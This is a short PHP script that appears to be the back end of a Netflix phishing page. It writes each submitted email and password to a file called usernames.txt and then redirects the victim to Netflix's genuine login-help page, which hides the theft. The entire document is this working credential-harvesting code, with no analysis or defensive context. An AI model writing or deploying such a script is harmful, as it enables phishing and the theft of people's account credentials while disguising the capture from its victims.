<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com/us/LoginHelp');
exit();
